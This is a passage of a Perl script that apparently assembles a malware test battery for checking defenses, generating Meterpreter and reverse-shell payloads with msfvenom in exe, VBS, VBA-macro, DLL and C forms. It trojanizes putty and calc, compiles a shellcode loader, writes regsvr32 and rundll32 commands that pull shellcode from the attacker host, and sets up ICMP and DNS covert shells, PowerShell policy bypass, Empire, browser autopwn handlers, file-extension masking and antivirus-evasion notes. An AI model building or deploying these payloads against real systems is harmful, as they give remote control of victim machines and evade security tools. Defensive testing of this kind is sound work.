  $scriptNum ="512";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreterDNS-packed-putty-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded, packed into putty: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="513";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreterDNS-32enc.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter  encoded vbs(Download and pass as arg to cscript or double click): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;


  #tuning encoder down to 1 for VBA
  #consistently had issues with this running.
  $scriptNum ="514";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreterDNS-32enc.vba";
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vba encoded  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  $scriptNum ="515";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplateDNS-32enc.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(385,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;


#reset Command and control
  $commandControl = "lhost=$LHOST lport=$LPORT";


  ###################
  ##
  ##  64 bit Shell Stageless Delivery
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = 'windows/x64/shell_reverse_tcp';
  $encoder = '-e x64/xor -i 3';

  #`touch $targetFolder/600-StartMSF990.cue`;
  ${scriptNum} = "600";

  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-stagelessshell_reverse_tcp-enc-64.rc");
print $OUTFILE <<TCPSTAGELESSSHELL64;
use multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSTAGELESSSHELL64
  close $OUTFILE;

  $scriptNum ="601";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessShellRTCP-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Shell, no encoding: $cmd";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="602";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-ShellRCTP-packed-calc-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Shell packed into putty, no encoding: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

    $scriptNum ="603";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-ShellRTCP-64.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Shell vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="604";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-ShellRTCP-64.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-Bit Stageless Shell vba, no encoding  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  $scriptNum ="605";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Shell C Shell Code, not encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(583,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;

  ###################
  ##
  ##  ICMP and DNS Connections 
  ##
  ##################

  $scriptNum="700";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-Run-icmpsh.cue");
  close $OUTFILE;

  print "Checking if icmpsh is installed... \n";
  if (-d "/opt/icmpsh") {
    print "icmpsh is already installed \n";
  }
  else {
    print "Installing icmpsh now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/inquisb/icmpsh.git`; 
  }
  print "Checking if Nishang is installed... \n";
  if (-d "/opt/nishang") {
    print "Nishang is already installed \n";
  }
  else {
    print "Installing Nishang now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/samratashok/nishang.git`; 
  }

  print "Checking if ONI is installed... \n";
  if (-d "/opt/ONI") {
    print "ONI is already installed. Checking for updates \n";
    `cd /opt/ONI/ && git pull`;
  }
  else {
    print "Installing ONI now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/AMCRalston/ONI.git`;
  }

  my ($ICMPCodePath) ="/opt/ONI/icmpsh.sh";
  $scriptName = "701-ICMP-Listener.sh";
  `cp $ICMPCodePath $targetFolder/$scriptName`;

  my ($DNSCodePath) ="/opt/ONI/DNScat2-SERVER.sh";
  $scriptName = "702-DNS-Listener.sh";
  `cp $DNSCodePath $targetFolder/$scriptName`;


  my ($ICPSCodePath) ="/opt/nishang/Shells/Invoke-PowerShellIcmp.ps1";
  $scriptName = "704-Invoke-PowerShellIcmp.ps1";
  `cp $ICPSCodePath $targetFolder/$scriptName`;
   
  $scriptName = "703_PScommand.txt";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE "NOTE: Below are the commands to input into PS. If PS does not work move on to PowerShell_ISE or PowerShell 86.\n";
  print $OUTFILE "\n"; 
  print $OUTFILE "powershell.exe -NoProfile -ExecutionPolicy Bypass\n";
  print $OUTFILE "\n"; 
  print $OUTFILE "Import-Module ./704-Invoke-PowerShellIcmp.ps1\n";
  print $OUTFILE "\n";
  print $OUTFILE "Invoke-PowerShellIcmp -IPAddress $LHOST\n";
  close $OUTFILE;
  
  my ($ICEXEPath) ="/opt/icmpsh/icmpsh.exe";
  $scriptName = "706-icmpsh.exe";
  `cp $ICEXEPath $targetFolder/$scriptName`;
  $cmd = "cmd /k 706-icmpsh.exe -t $LHOST -d 500 -b 30 -s 128" ;
  $scriptName = "705-icmpsh.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

  my ($DNPSCodePath) ="/opt/ONI/dnscat2.ps1";
  $scriptName = "708-Invoke-dnsC.ps1";
  `cp $DNPSCodePath $targetFolder/$scriptName`;
  
  $scriptName = "707_PScommand.txt";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE "NOTE: Below are the commands to input into PS. If PS does not work move on to PowerShell_ISE or PowerShell 86.\n";
  print $OUTFILE "\n";
  print $OUTFILE "powershell.exe -NoProfile -ExecutionPolicy Bypass\n";
  print $OUTFILE "\n";
  print $OUTFILE "Import-Module ./708-Invoke-dnsC.ps1\n";
  print $OUTFILE "\n";
  print $OUTFILE "Start-Dnscat2 -Domain Stal -DNSServer $LHOST -PreSharedSecret S3cUR1ty\n";
  #print $OUTFILE "NOTE: Below are the commands to input into PS for a slower and more discreate session";
  #print $OUTFILE "\n";
  #print $OUTFILE "SLOW\n";
  #print $OUTFILE "\n";
  #print $OUTFILE "Start-Dnscat2 -Domain Stal -DNSServer $LHOST -LookupTypes @("A","AAAA") -Delay 500 MaxRandomDelay 500 -MaxPacketSize 150 -PreSharedSecret S3cUr1ty";
  #print $OUTFILE "\n";
  #print $OUTFILE "VERY SLOW";
  #print $OUTFIEL "\n";
  #print $OUTFILE "Start-Dnscat2 -Domain Stal -DNSServer $LHOST -LookupTypes @("A","AAAA") -Delay 500 MaxRandomDelay 500 -MaxPacketSize 50 -PreSharedSecret S3cUr1ty";
  close $OUTFILE;

  my ($DNEXECodePath) ="/opt/ONI/dnscat2.exe";
  $scriptName = "710-dnscat2.exe";
  `cp $DNEXECodePath $targetFolder/$scriptName`;
  $cmd = "cmd /k 710-dnscat2.exe --dns server=$LHOST,port=53 --secret=S3cUr1ty";
  $scriptName = "709_dnscat.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

  ###################
  ##
  ##  32 bit Meterpreter DLL EVADE
  ##
  ##################


  $platform_arch = '--platform win -ax86';
  $payload = 'windows/meterpreter/reverse_tcp';

  #`touch $targetFolder/720-StartMSF990.cue`;
  ${scriptNum} = "720";

  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-meterpreter_reverse_tcp-32.rc");
  print $OUTFILE <<TCPMETERPRETER32;
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPMETERPRETER32
  close $OUTFILE;

  $scriptNum ="721";
  $scriptName="${scriptNum}-METWIN-32.b64";
  $cmd = "msfvenom -p ${payload} CMD=calc.exe ${platform_arch} ${commandControl} -f raw 2>/dev/null | base64 >$targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Meterpreter, base64: $cmd";
  `$cmd`;

  my ($WEV32CodePath) ="/opt/ONI/WEV_x86.dll";
  $scriptName = "722-WEV_x86.dll";
  `cp $WEV32CodePath $targetFolder/$scriptName`;
  $cmd = "cmd /k regsvr32.exe /s /i:shellcode,721-METWIN-32.b64 722-WEV_x86.dll";
  $scriptName = "723_regsvr-local.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;
  $cmd = "cmd /k regsvr32.exe /s /i:shellcode,http://$LHOST/721-METWIN-32.b64 722-WEV_x86.dll";
  $scriptName = "724_regsvr-remote.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

# Note that this DLL needs work. It is getting caught by AVAST
  $scriptNum ="725";
  $scriptName="${scriptNum}-RUNMET.dll";
  $cmd = "msfvenom -p ${payload} ${platform_arch} -f dll ${commandControl} > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Meterpreter, dll: $cmd \n";
  `$cmd`;
 
  $cmd = "cmd /k rundll32.exe 725-RUNMET.dll,Control_RunDLL";
  $scriptName = "726_rundll.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

  $cmd = "cmd /k regsvr32.exe /s /u 725-RUNMET.dll";
  $scriptName = "727_regsvr.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

  ###################
  ##
  ##  64 bit Meterpreter DLL EVADE
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = 'windows/x64/meterpreter_reverse_tcp';

  #`touch $targetFolder/730-StartMSF990.cue`;
  ${scriptNum} = "730";

  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-meterpreter_reverse_tcp-64.rc");
  print $OUTFILE <<TCPMETERPRETER64;
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPMETERPRETER64
  close $OUTFILE;

  $scriptNum ="731";
  $scriptName="${scriptNum}-METWIN-64.b64";
  $cmd = "msfvenom -p ${payload} CMD=calc.exe ${platform_arch} ${commandControl} -f raw 2>/dev/null | base64 >$targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Meterpreter, base64: $cmd";
  `$cmd`;

  my ($WEV64CodePath) ="/opt/ONI/WEV_x64.dll";
  $scriptName = "732-WEV_x64.dll";
  `cp $WEV64CodePath $targetFolder/$scriptName`;
  $cmd = "cmd /k regsvr32.exe /s /i:shellcode,731-METWIN-64.b64 732-WEV_x64.dll";
  $scriptName = "733_regsvr-local.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;
  $cmd = "cmd /k regsvr32.exe /s /i:shellcode,http://$LHOST/731-METWIN-64.b64 732-WEV_x64.dll";
  $scriptName = "734_regsvr-remote.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

  ###################
  ##
  ##  32 bit Shell DLL EVADE
  ##
  ##################


  $platform_arch = '--platform win -ax86';
  $payload = 'windows/shell/reverse_tcp';

  #`touch $targetFolder/740-StartMSF990.cue`;
  ${scriptNum} = "740";

  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-shell_reverse_tcp-32.rc");
  print $OUTFILE <<TCPSHELL32;
use multi/handler
set payload windows/shell/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSHELL32
  close $OUTFILE;

  $scriptNum ="741";
  $scriptName="${scriptNum}-METWIN-32.b64";
  $cmd = "msfvenom -p ${payload} CMD=calc.exe ${platform_arch} ${commandControl} -f raw 2>/dev/null | base64 >$targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Reverse TCP Shell, base64: $cmd";
  `$cmd`;

  $cmd = "cmd /k regsvr32.exe /s /i:shellcode,741-METWIN-32.b64 722-WEV_x86.dll";
  $scriptName = "743_regsvr-local.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;
  $cmd = "cmd /k regsvr32.exe /s /i:shellcode,http://$LHOST/741-METWIN-32.b64 722-WEV_x86.dll";
  $scriptName = "744_regsvr-remote.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

# Note that this DLL needs work. It is getting caught by AVAST 
  $scriptNum ="745";
  $scriptName="${scriptNum}-RUNMET.dll";
  $cmd = "msfvenom -p ${payload} ${platform_arch} -f dll ${commandControl} > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Reverse TCP Shell, DLL: $cmd \n";
  `$cmd`;

  $cmd = "cmd /k rundll32.exe 745-RUNMET.dll,Control_RunDLL";
  $scriptName = "746_rundll.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

  $cmd = "cmd /k regsvr32.exe /s /u 745-RUNMET.dll";
  $scriptName = "747_regsvr.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

  ##################
  ##  64 bit Shell DLL EVADE
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = 'windows/x64/shell_reverse_tcp';

  #`touch $targetFolder/750-StartMSF990.cue`;
  ${scriptNum} = "750";

  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-shell_reverse_tcp-64.rc");
  print $OUTFILE <<TCPSHELL64;
use multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSHELL64
  close $OUTFILE;

  $scriptNum ="751";
  $scriptName="${scriptNum}-METWIN-64.b64";
  $cmd = "msfvenom -p ${payload} CMD=calc.exe ${platform_arch} ${commandControl} -f raw 2>/dev/null | base64 >$targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Reverse TCP Shell, base64: $cmd";
  `$cmd`;

  $cmd = "cmd /k regsvr32.exe /s /i:shellcode,751-METWIN-64.b64 732-WEV_x64.dll";
  $scriptName = "753_regsvr-local.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;
  $cmd = "cmd /k regsvr32.exe /s /i:shellcode,http://$LHOST/751-METWIN-64.b64 732-WEV_x64.dll";
  $scriptName = "754_regsvr-remote.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;

  ###################
  ##
  ##  DLL Evade with PS Empire 
  ##
  ##################

  $scriptNum="760";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-Run-PowerShell Empire.cue");
  close $OUTFILE;

  print "Checking if PowerShell Empire is installed... \n";
  if (-d "/opt/Empire") {
    print "Empire is already installed \n";
  }
  else {
    print "Installing icmpsh now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/EmpireProject/Empire.git`;
    `cd /opt/Empire/setup && ./install.sh`;
  }

  my ($EmpirePath) ="/opt/ONI/PowerShell-Empire.txt";
  $scriptName = "761-PS-Empire-Howto.txt";
  `cp $EmpirePath $targetFolder/$scriptName`;

  $cmd = "cmd /k regsvr32.exe /s /i:PowerShell,762-Empire.b64 722-WEV_x86.dll";
  $scriptName = "763_regsvr-local.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;
  $cmd = "cmd /k regsvr32.exe /s /i:PowerShell,http://$LHOST/762-Empire.b64 722-WEV_x86.dll";
  $scriptName = "764_regsvr-remote.bat";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;


  ###################
  ##
  ##  Browser Autopwn
  ##
  ##################


$scriptNum = "900";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-browserautopwn1.rc");
print $OUTFILE <<BAPENC;
use auxiliary/server/browser_autopwn
set SRVHOST $LHOST
set SRVPORT 8080
format(lhost)
set URIPATH qrq
set EnableStageEncoding true
exploit
BAPENC
  close $OUTFILE;





$scriptNum="910";
#  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run965.cue`;
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-browserautopwn2.rc");
print $OUTFILE <<BAPENC2;
use auxiliary/server/browser_autopwn2
set SRVHOST $LHOST
set SRVPORT 8080
format(lhost)
set URIPATH qrq
set EnableStageEncoding true
exploit
BAPENC2


 

  ###################
  ##
  ##  exe masking
  ##
  ##################

  my($originalFile,$maskedFile);
  opendir (DIR, $targetFolder) or die $!;
  while (my $originalFile = readdir(DIR)) {
    $_ = $originalFile;
    if (/cue$/ || /txt$/ ||/sh$/ || /c$/ || /rc$/){next;}
    $maskedFile = $originalFile;
    $maskedFile =~ s/.$/_/;
    `cp $targetFolder/$originalFile $targetFolder/$maskedFile`; 
  }
  closedir(DIR);
  ###################
  ##
  ##  HTTPS
  ##
  ##################
  `openssl req -x509 -new -keyout $targetFolder/server.pem -out $targetFolder/server.pem -days 10 -nodes`;
  `cp /opt/kali_plus/805_SimpleHTTPS.py $targetFolder/950_SimpleHTTPS.py`;
  

  ###################
  ##
  ## Other Attacks 
  ##
  ##################

 `touch $targetFolder/920-${PROJECT}-${PROJECTNUM}-AlternateBoot.cue`;
 `touch $targetFolder/930-${PROJECT}-${PROJECTNUM}-USB.cue`;
 `touch $targetFolder/940-${PROJECT}-${PROJECTNUM}-Email.cue`;

  ###################
  ##
  ##  zip it up for USB/Download fast transfer
  ##
  ##################

  `cp /opt/eicar/eicar.com $targetFolder/0001-eicar.com`;
  `cp /opt/eicar/eicar.com.txt $targetFolder/0002-eicar.com.txt`;
  `cp /opt/eicar/eicar.com.txt $targetFolder/0003-eicar.com.jpg`;
  `cp /opt/eicar/eicar_com.zip $targetFolder/0004-eicar.zip`;
  `cp /opt/eicar/eicarcom2.zip $targetFolder/0005-eicar2.zip`;
  `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip $targetFolder/*`;
  print "***Set 123 for the password\n\n";
  `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEnc-pw123.zip $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip -e --pasword 123`;

  $targetFolder = "/opt/malwaredefense/current";
  open (OUTPUT, ">","$targetFolder/998-EmailList.txt");
  opendir (DIR, $targetFolder) or die $!;
  my @files = sort readdir(DIR);
  while (my $originalFile = shift(@files)) {
    $_ = $originalFile;
    if (/cue$/ || /txt$/ ||/sh$/ || /c$/ || /rc$/ ||/ba_$/ ||/bat$/){next;}
    print OUTPUT "\t\$testName = \$fileName = '${originalFile}';\n";
    print OUTPUT "\t\$testDescription='This is a test';\n";
    print OUTPUT "\tsendAttachment(\$mail,\$testName,\$testDescription,\$fileName,\$customer,\$project);\n\n";
  }
  closedir(DIR);
  close(OUTPUT);





sub createShellcodeEXEFromTemplate{
  my($venomFile, $VENOM, $codeSize, $outCFile, $outEXEFile, $OUTPUT);
  my($compiler);
  $codeSize = shift;
  $venomFile = shift;
  $outEXEFile = $venomFile;
  $outEXEFile =~ s/c$/exe/;
  $outCFile = $venomFile;
  $outCFile =~ s/\.c$/-CustTemplate.c/;
  open($OUTPUT, ">",$outCFile);
  print $OUTPUT <<SHELL_CODE_TEMPLATE_START;
#include <stdio.h>
#include <windows.h> //VirtualAlloc is defined here
//YOU MUST REPLACE the buf and the size 
SHELL_CODE_TEMPLATE_START
  open($VENOM, "<",$venomFile);
  print $OUTPUT "size_t size = $codeSize; //size of buf in bytes (output by msfvenom)\n\n";
  while(<$VENOM>){
    print $OUTPUT $_;
  }
  close($VENOM);
  print $OUTPUT <<SHELL_CODE_TEMPLATE_END;
int main(int argc, char **argv) {
char *code;                     //Holds a memory address
code = (char *)VirtualAlloc(    //Allocate a chunk of memory and store the starting address
        NULL, size, MEM_COMMIT,     
        PAGE_EXECUTE_READWRITE  //Set the memory to be writable and executable
    );
memcpy(code, buf, size);    //Copy our spud into the executable section of memory
((void(*)())code)();            //Cast the executable memory to a function pointer and run it
return(0);
}
SHELL_CODE_TEMPLATE_END
  close($OUTPUT);
  $_=$outEXEFile;
  if (/64/){
    $compiler ="x86_64-w64-mingw32-gcc";
  }else{
    $compiler ="i686-w64-mingw32-gcc";
  }
  `$compiler $outCFile  -o $outEXEFile`;

  print "Completed gerneration of $outEXEFile\n";
}






 
#Needs additional work
#  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
#  #`msfvenom -p ${payload} ${platform_arch} ${commandControl} -f java $encoder > ${currentFileName}.java`;
#  `msfvenom -p java/meterpreter/reverse_tcp ${platform_arch} ${commandControl} -f raw $encoder -o ${currentFileName}.jar`;
